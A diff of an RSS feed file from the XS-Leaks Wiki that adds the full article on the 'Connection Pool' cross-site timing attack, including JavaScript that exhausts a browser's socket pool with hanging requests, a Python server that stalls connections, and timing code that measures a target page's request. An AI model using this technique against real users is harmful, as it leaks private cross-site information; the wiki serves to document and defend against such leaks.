@@ -1,3 +1,65 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Browser Limits on XS-Leaks Wiki</title><link>https://xsleaks.dev/abuse/browser-limits/</link><description>Recent content in Browser Limits on XS-Leaks Wiki</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Sun, 21 Apr 2024 20:35:32 +0100</lastBuildDate><atom:link href="https://xsleaks.dev/abuse/browser-limits/index.xml" rel="self" type="application/rss+xml"/><item><title>Connection Pool</title><link>https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/</link><pubDate>Thu, 01 Oct 2020 00:00:00 +0000</pubDate><guid>https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/</guid><description>Another way to measure the network timing of a request consists of abusing the socket pool of a browser 1. Browsers use sockets to communicate with servers. As the operating system and the hardware it runs on have limited resources, browsers have to impose a limit. Run demo (Chrome) Run demo (Firefox)
-To exploit the existence of this limit, attackers can:
-Check what the limit of the browser is, for example 256 global sockets for TCP and 6000 global sockets for UDP.</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Abuse/Browser Limits on XS-Leaks Wiki</title><link>https://xsleaks.dev/abuse/browser-limits/</link><description>Recent content in Abuse/Browser Limits on XS-Leaks Wiki</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Sun, 21 Apr 2024 20:35:32 +0100</lastBuildDate><atom:link href="https://xsleaks.dev/abuse/browser-limits/index.xml" rel="self" type="application/rss+xml"/><item><title>Connection Pool</title><link>https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/</link><pubDate>Thu, 01 Oct 2020 00:00:00 +0000</pubDate><guid>https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/</guid><description>&lt;p>Another way to measure the network timing of a request consists of abusing the socket pool of a browser &lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>. Browsers use sockets to communicate with servers. As the operating system and the hardware it runs on have limited resources, browsers have to impose a limit. &lt;a href="https://xsinator.com/testing.html#WebSocket%20Leak%20%28GC%29">Run demo (Chrome)&lt;/a> &lt;a href="https://xsinator.com/testing.html#WebSocket%20Leak%20%28FF%29">Run demo (Firefox)&lt;/a>&lt;/p>
+&lt;p>To exploit the existence of this limit, attackers can:&lt;/p>
+&lt;ol>
+&lt;li>Check what the limit of the browser is, for example 256 global sockets for TCP and 6000 global sockets for UDP. &lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>&lt;sup id="fnref:3">&lt;a href="#fn:3" class="footnote-ref" role="doc-noteref">3&lt;/a>&lt;/sup>&lt;/li>
+&lt;li>Block 
+&lt;link rel="stylesheet" href="https://xsleaks.dev/katex/katex.min.css" />
+&lt;script defer src="https://xsleaks.dev/katex/katex.min.js">&lt;/script>
+&lt;script defer src="https://xsleaks.dev/katex/auto-render.min.js" onload="renderMathInElement(document.body);">&lt;/script>&lt;span>
+ \(255\)
+&lt;/span>
+ sockets for a long period of time by performing &lt;span>
+ \(255\)
+&lt;/span>
+ requests to different hosts that simply hang the connection&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">// Client
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">&lt;/span>&lt;span style="color:#ff79c6">for&lt;/span>(&lt;span style="color:#8be9fd;font-style:italic">let&lt;/span> i&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#bd93f9">0&lt;/span>; i&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>&lt;span style="color:#bd93f9">255&lt;/span>; i&lt;span style="color:#ff79c6">++&lt;/span>) fetch(&lt;span style="color:#f1fa8c">&amp;#39;https://&amp;#39;&lt;/span>&lt;span style="color:#ff79c6">+&lt;/span>i&lt;span style="color:#ff79c6">+&lt;/span>&lt;span style="color:#f1fa8c">&amp;#39;.example.com/&amp;#39;&lt;/span>, {mode&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;no-cors&amp;#34;&lt;/span>, cache&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;no-store&amp;#34;&lt;/span>});
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># Server&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">from&lt;/span> http.server &lt;span style="color:#ff79c6">import&lt;/span> BaseHTTPRequestHandler, HTTPServer
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> time
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">class&lt;/span> &lt;span style="color:#50fa7b">handler&lt;/span>(BaseHTTPRequestHandler):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">def&lt;/span> &lt;span style="color:#50fa7b">do_GET&lt;/span>(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#ff79c6">.&lt;/span>sleep(&lt;span style="color:#8be9fd;font-style:italic">float&lt;/span>(&lt;span style="color:#bd93f9">100000&lt;/span>))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#ff79c6">.&lt;/span>send_response(&lt;span style="color:#bd93f9">200&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#ff79c6">.&lt;/span>send_header(&lt;span style="color:#f1fa8c">&amp;#39;Cache-Control&amp;#39;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#39;no-store&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#ff79c6">.&lt;/span>end_headers()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">with&lt;/span> HTTPServer((&lt;span style="color:#f1fa8c">&amp;#39;&amp;#39;&lt;/span>, &lt;span style="color:#bd93f9">8000&lt;/span>), handler) &lt;span style="color:#ff79c6">as&lt;/span> server:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> server&lt;span style="color:#ff79c6">.&lt;/span>serve_forever()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
+&lt;li>Use the &lt;span>
+ \(256^{th}\)
+&lt;/span>
+ socket by performing a request to the target page.&lt;/li>
+&lt;li>Perform a &lt;span>
+ \(257^{th}\)
+&lt;/span>
+ request to another host. Since all the sockets are being used (in steps 2 and 3), this request must wait until the pool receives an available socket. This waiting period provides the attacker with the network timing of the &lt;span>
+ \(256^{th}\)
+&lt;/span>
+ socket, which belongs to the target page. This works because the &lt;span>
+ \(255\)
+&lt;/span>
+ sockets in step 2 are still blocked, so if the pool received an available socket, it was caused by the release of the socket in step 3. The time to release the &lt;span>
+ \(256^{th}\)
+&lt;/span>
+ socket is directly connected with the time taken to complete the request.&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>performance.clearResourceTimings();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">await&lt;/span> fetch(location.href, {cache&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;no-store&amp;#34;&lt;/span>});
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">await&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">Promise&lt;/span>(r =&amp;gt; setTimeout(r, &lt;span style="color:#bd93f9">1000&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">let&lt;/span> data &lt;span style="color:#ff79c6">=&lt;/span> performance.getEntries().pop();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">let&lt;/span> type &lt;span style="color:#ff79c6">=&lt;/span> (data.connectStart &lt;span style="color:#ff79c6">===&lt;/span> data.startTime) &lt;span style="color:#ff79c6">?&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;reused&amp;#39;&lt;/span> &lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;new&amp;#39;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>console.log(&lt;span style="color:#f1fa8c">&amp;#39;Time spent: &amp;#39;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> data.duration &lt;span style="color:#ff79c6">+&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39; on &amp;#39;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> type &lt;span style="color:#ff79c6">+&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39; connection.&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="connection-reuse">
+ Connection reuse
+ &lt;a class="anchor" href="#connection-reuse">#&lt;/a>
+&lt;/h2>
+&lt;p>With HTTP/1.1 (TCP) and HTTP/2 (TCP) and HTTP/3 (UDP) requests may reuse an existing connection for a host to improve performance. &lt;sup id="fnref:4">&lt;a href="#fn:4" class="footnote-ref" role="doc-noteref">4&lt;/a>&lt;/sup>&lt;sup id="fnref:5">&lt;a href="#fn:5" class="footnote-ref" role="doc-noteref">5&lt;/a>&lt;/sup>
+HTTP/2 also has Connection Coalescing which allows different hostnames that are accessible from the same web server to reuse a connection. &lt;sup id="fnref:6">&lt;a href="#fn:6" class="footnote-ref" role="doc-noteref">6&lt;/a>&lt;/sup>
+This is currently keyed by if credentials are included in the request.
+Since a reused connection is normally faster this could allow for detecting if a site has connected to a host excluding anything that’s been cached and leaking information about the cross-site request by abusing Stream prioritization and HPACK compression. &lt;sup id="fnref:7">&lt;a href="#fn:7" class="footnote-ref" role="doc-noteref">7&lt;/a>&lt;/sup>
+Connections may get closed if they are left idle or the sockets are exhausted, for example 256 connections for HTTP/2 or 30 seconds idle for HTTP/3. &lt;sup id="fnref1:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>&lt;sup id="fnref:8">&lt;a href="#fn:8" class="footnote-ref" role="doc-noteref">8&lt;/a>&lt;/sup>
+This may also leak when the connection happened and the browser can have per connection limits and on how many connections are allowed per host, for example 6 connections per host. &lt;sup id="fnref2:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>&lt;/p></description></item></channel></rss>
